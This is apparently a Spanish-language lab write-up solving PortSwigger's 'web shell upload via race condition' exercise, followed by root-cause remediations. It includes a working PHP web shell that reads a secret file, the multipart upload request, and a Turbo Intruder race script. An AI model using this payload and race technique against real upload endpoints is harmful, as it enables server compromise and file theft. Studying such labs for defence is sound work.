# Lab: Web shell upload via race condition

**Plataforma:** PortSwigger Web Security Academy  
**Categoría:** File upload vulnerabilities / Race condition  
**Dificultad:** Practitioner  
**Estado:** Se obtuvo el secreto del laboratorio  
**URL del lab:** https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition

---

## 📌 Enunciado

La aplicación permite subir imágenes de avatar y valida los archivos. Sin embargo, existe una condición de carrera en el procesamiento: un archivo puede quedar accesible durante un breve intervalo antes de que el servidor termine la validación y lo elimine.

**Objetivo:** subir un archivo PHP y leer `/home/carlos/secret` para obtener el secreto que se envía en el banner del laboratorio.

---

## 🔍 Reconocimiento

En la cuenta de usuario, el formulario de subida envía una petición `POST /my-account/avatar` con `multipart/form-data` y tres campos: `avatar`, `user` y `csrf`.

Fragmento relevante de la petición interceptada (se omiten host específico, cookies y token CSRF):

```http
POST /my-account/avatar HTTP/2
Host: <LAB-ID>.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

------WebKitFormBoundary...
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary...
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary...
Content-Disposition: form-data; name="csrf"

<CSRF_TOKEN>
------WebKitFormBoundary...--
```

Al intentar subir directamente el archivo PHP, el servidor devuelve:

```http
HTTP/2 403 Forbidden
Server: Apache/2.4.41 (Ubuntu)

Sorry, only JPG & PNG files are allowed
Sorry, there was an error uploading your file.
```

Esto evidencia que el servidor **rechaza el archivo tras procesar la subida**, pero no descarta una condición de carrera.

---

## 🔬 Identificación de la vulnerabilidad

**CWE-362 — Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition).**

El código de ejemplo del laboratorio muestra el siguiente orden lógico:

1. Trasladar el archivo recibido a `avatars/`.
2. Realizar las verificaciones de virus y tipo de archivo.
3. Si falla alguna comprobación, eliminar el archivo con `unlink()`.

Durante el paso 2, `exploit.php` ya puede estar disponible bajo `/files/avatars/exploit.php`. Una petición HTTP que llegue antes del borrado puede activar la interpretación del código PHP. El fallo no consiste en desactivar la validación, sino en **publicar el archivo antes de validarlo**.

---

## 🚀 Explotación con Burp Suite y Turbo Intruder

### 1. Preparación de la carga

Se empleó el siguiente archivo `exploit.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Este código imprime el contenido del archivo objetivo en la respuesta HTTP si llega a ejecutarse.

### 2. Preparación del ataque concurrente

Se envió la petición de subida `POST /my-account/avatar` a la extensión **Turbo Intruder**. Se preparó también una petición para recuperar el archivo recién subido:

```http
GET /files/avatars/exploit.php HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Connection: close

```

Se utilizó una *gate* para coordinar un `POST` y cinco `GET`, intentando que las peticiones al script se procesaran durante la validación:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=10
    )

    request1 = target.req  # POST multipart interceptado desde Burp

    request2 = (
        "GET /files/avatars/exploit.php HTTP/1.1\r\n"
        "Host: <LAB-ID>.web-security-academy.net\r\n"
        "Connection: close\r\n"
        "\r\n"
    )

    engine.queue(request1, gate='race1')

    for x in range(5):
        engine.queue(request2, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

**Importante:** reemplazar `<LAB-ID>` por el host del laboratorio activo. La petición original de subida debe contener una sesión y un token CSRF vigentes. La ejecución de una *gate* mejora la sincronización, pero no garantiza que cada intento tenga éxito.

### 3. Resultado

La explotación mediante Turbo Intruder permitió obtener el contenido de `/home/carlos/secret`:

```text
kcZCrQgsDaCCK8cbUMDNcrgZCHwET8Og
```

**Nota de evidencia:** se confirmó la obtención del secreto durante la resolución. No se adjuntó captura de la tabla de Turbo Intruder ni confirmación posterior del estado `SOLVED` del banner.

---

## 🛡️ Causa raíz y remediaciones

La aplicación copia el archivo a un directorio servible por el servidor web **antes** de concluir las verificaciones de seguridad; eliminarlo después no impide que se ejecute durante ese intervalo.

1. Guardar archivos en un directorio temporal privado, fuera del *webroot*.
2. Validar tipo, contenido y seguridad del archivo **antes** de publicarlo.
3. Publicar únicamente archivos validados mediante un movimiento atómico.
4. Deshabilitar la ejecución de PHP y otros scripts en cualquier directorio de cargas.
5. Asignar nombres aleatorios y no confiables en lugar de aceptar directamente el nombre original del archivo.

## 🧠 Aprendizaje para CTF

**Señales:** el enunciado menciona condiciones de carrera; existe subida de archivos; el servidor rechaza tipos ejecutables; los archivos quedan accesibles por una URL predecible.

**Ruta rápida:** interceptar el `POST` → preparar un `GET` al destino del archivo → coordinar solicitudes concurrentes → buscar una respuesta que contenga el secreto. Un `403` en la subida no invalida la explotación si una petición `GET` alcanza la ventana temporal.

---

**Referencias:**
- [Laboratorio oficial](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)
- [PortSwigger — File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
